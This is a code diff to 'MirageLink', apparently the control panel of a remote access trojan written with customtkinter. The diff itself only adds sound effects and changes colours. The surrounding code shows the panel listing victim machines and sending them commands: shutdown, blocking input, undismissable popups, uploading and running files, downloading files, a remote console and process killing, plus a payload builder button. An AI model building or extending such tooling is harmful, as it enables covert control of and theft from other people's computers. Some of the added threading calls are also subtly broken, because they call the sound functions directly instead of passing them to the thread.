@@ -1,5 +1,6 @@
 import customtkinter as ctk
 import socket
+import soundpad
 import pygame
 import os
 import time
@@ -63,7 +64,7 @@ class Server(ctk.CTk):
                     client_thread = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True)
                     client_thread.start()
         
-                    sound = pygame.mixer.Sound('server_fold/sounds/plus.mp3').play()
+                    threading.Thread(target=soundpad.connect(), daemon=True).start()
         except Exception as e:
             print(f"Server error: {e}")
         finally:
@@ -102,6 +103,7 @@ class Server(ctk.CTk):
         except (Exception) as e:
             print(f"Handle error: {e}")
         finally:
+            threading.Thread(target=soundpad.disconnect(), daemon=True).start()
             print(f"Connection: {addr} closed")
             self.remove_client(addr)
 
@@ -223,6 +225,7 @@ class MirageApp(ctk.CTk):
         ctk.set_appearance_mode("dark")
         ctk.set_default_color_theme("dark-blue")
 
+
         self.users = []
         self.user_frames = []
 
@@ -241,32 +244,33 @@ class MirageApp(ctk.CTk):
         self.create_app()
 
     def create_app(self):
-        self.gbw_frame = ctk.CTkFrame(self, width=1000, height=100, fg_color='#4B0082')
-        self.gbw_title = ctk.CTkLabel(self.gbw_frame, text='⚉ MirageLink ⚉ made by: GBW ♥', text_color='black', font=('Bold', 30))
+        self.gbw_frame = ctk.CTkFrame(self, width=1000, height=100, fg_color='#1e1f26')
+        self.gbw_title = ctk.CTkLabel(self.gbw_frame, text='⚉ MirageLink ⚉ made by: GBW ♥', text_color='white', font=('Bold', 30))
         self.gbw_frame.pack(side='top', fill='x')
         self.gbw_title.pack(side='left', pady=10)
 
-        self.menu = ctk.CTkFrame(self, width=1000, height=30, fg_color='#9370DB')
+        self.menu = ctk.CTkFrame(self, width=1000, height=30, fg_color='#283655')
         self.menu.pack(side='top', fill='x')
 
         self.text_ip = ctk.CTkLabel(self.menu, text='IP', text_color='white', font=('Bold', 20))
         self.text_port = ctk.CTkLabel(self.menu, text='PORT', text_color='white', font=('Bold', 20))
         self.text_contry = ctk.CTkLabel(self.menu, text='CONTRY', text_color='white', font=('Bold', 20))
-        self.builder_btn = ctk.CTkButton(self.menu, height=10, width=100, text='BUILD', text_color='red', font=('Bold', 15),
-                                          fg_color='#9370DB', command=self.draw_config_app)
-        self.info_btn = ctk.CTkButton(self.menu, height=10, width=100, text='Info', text_color='red', font=('Bold', 15),
-                                          fg_color='#9370DB', command=self.draw_info_app)
-        self.setting_btn = ctk.CTkButton(self.menu, height=10, width=100, text='Setting', text_color='red', font=('Bold', 15),
-                                          fg_color='#9370DB', command=self.draw_settings_app)
+        self.builder_btn = ctk.CTkButton(self.menu, height=10, width=100, text='BUILD', text_color='white', font=('Bold', 15),
+                                          fg_color='#283655', command=self.draw_config_app)
+        self.info_btn = ctk.CTkButton(self.menu, height=10, width=100, text='Info', text_color='white', font=('Bold', 15),
+                                          fg_color='#283655', command=self.draw_info_app)
+        self.setting_btn = ctk.CTkButton(self.menu, height=10, width=100, text='Setting', text_color='white', font=('Bold', 15),
+                                          fg_color='#283655', command=self.draw_settings_app)
         self.text_ip.pack(side='left', padx=75)
         self.text_port.pack(side='left', padx=75)
         self.text_contry.pack(side='left', padx=75)
         self.builder_btn.pack(side='right', padx=5)
         self.setting_btn.pack(side='right', padx=5)
         self.info_btn.pack(side='right', padx=5)
-
+    
+    
     def create_user(self, ip, port, country):
-        user_ground = ctk.CTkFrame(self, width=970, height=150, fg_color='#4B0082', corner_radius=10)
+        user_ground = ctk.CTkFrame(self, width=970, height=150, fg_color='#4d648d', corner_radius=10)
         user_ground.pack(side='top', padx=10, pady=5, fill='x')
 
         user_ip = ctk.CTkLabel(user_ground, text=f"IP: {ip}", text_color="white", font=('Bold', 15))
@@ -277,7 +281,7 @@ class MirageApp(ctk.CTk):
         user_contry.pack(side='left', padx=50)
 
         select_func_button = ctk.CTkButton(user_ground, width=300, height=45, text='Function', font=('Bold', 20),
-                                           corner_radius=10, command=lambda: self.draw_func_app(ip, port), fg_color='#9370DB')
+                                           corner_radius=10, command=lambda: self.draw_func_app(ip, port), fg_color='#1e1f26')
         select_func_button.pack(side='right', pady=5, padx=5)
 
         self.user_frames.append(user_ground)
@@ -293,18 +297,22 @@ class MirageApp(ctk.CTk):
             self.create_user(user["ip"], user["port"], user["country"])
 
     def draw_settings_app(self):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         self.setting_app = settings.SettingsApp(self)
         self.setting_app.grab_set()
 
     def draw_info_app(self):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         self.info_app = info.InfoApp(self)
         self.info_app.grab_set()
 
     def draw_config_app(self):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         self.config_app = build_config.BuildConfigApp(self) 
         self.config_app.grab_set() 
 
     def draw_func_app(self, ip, port):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         func_app = function.FunctionApp(ip, port, self.server)
         threading.Thread(target=func_app.mainloop()).start()
 
@@ -314,49 +322,60 @@ class CommandFunction:
         self.server = server
 
     def off_pc(self, ip, port, reboot=False):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         if reboot == False:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, 'off'), daemon=True).start()
         else:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, 'reboot'), daemon=True).start()
 
     def display_controll(self, ip, port, on=False):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         if on == False:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, 'display black'), daemon=True).start()
         else:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, 'display white'), daemon=True).start()
 
     def set_wallpaper(self, ip, port):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         file_path = filedialog.askopenfilename(title="Select file")
         if file_path:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, f'set_wallpaper {file_path}'), daemon=True).start()
 
     def msg_box(self, ip, port, msg, no_close=False):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         if no_close == False:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, f'msg {msg}'), daemon=True).start()
         else:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, f'no_close_box {msg}'), daemon=True).start()
 
     def console(self, ip, port):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         self.console_app = console.ConsoleApp(ip, port, self.server)
 
     def block_input(self, ip, port):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         threading.Thread(target=self.server.send_to_client, args=(ip, port, 'block_input'), daemon=True).start()
 
     def remote_tool(self, ip, port):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         threading.Thread(target=self.server.send_to_client, args=(ip, port,'remote'), daemon=True).start()
 
     def get_info(self, ip, port):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         threading.Thread(target=self.server.send_to_client, args=(ip, port, 'get_info'), daemon=True).start()
 
     def open_link(self, ip, port, link):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         threading.Thread(target=self.server.send_to_client, args=(ip, port, f'open_link {link}'), daemon=True).start()
 
     def send_and_run(self, ip, port):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         file_path = filedialog.askopenfilename(title="Select file")
         if file_path:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, f's_run {file_path}'), daemon=True).start()
     
     def screemer(self, ip, port):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         print("Screemer in dev")
         """
         file_path = filedialog.askopenfilename(title="Select file")
@@ -365,11 +384,13 @@ class CommandFunction:
         """
         
     def send_file(self, ip, port):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         file_path = filedialog.askopenfilename(title="Select file")
         if file_path:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, f'send {file_path}'), daemon=True).start()
 
     def file_manager(self, ip, port):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         threading.Thread(target=self.server.send_to_client, args=(ip, port, "file start")).start()
 
         addr, files_json = self.server.msg_queue.get()
@@ -377,9 +398,11 @@ class CommandFunction:
         self.file_app = file_manager.FileManagerApp(ip, port, self.server, files_list)
 
     def download_file(self, ip, port, filename):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         threading.Thread(target=self.server.send_to_client, args=(ip, port, f'download {filename}'), daemon=True).start()
 
     def killer(self, ip, port, kill=False):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         data = messagebox.askyesno('MirageLink', 'You sure ???')
         if data == True:
             if kill == False:
@@ -387,19 +410,17 @@ class CommandFunction:
             threading.Thread(target=self.server.send_to_client, args=(ip, port, 'kill'), daemon=True).start()
 
     def post_msg(self, ip, port, msg):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         threading.Thread(target=self.server.send_to_client, args=(ip, port, msg), daemon=True).start()
 
     def send_msg(self, msg):
+        threading.Thread(target=soundpad.click(), daemon=True).start()
         data = messagebox.showinfo('MirageLink', msg)
         return data
 
 
 def main():
-    pygame.init()
-    pygame.mixer.init()
-
     app = MirageApp().mainloop()
-
 
 if __name__ == "__main__":
     main()
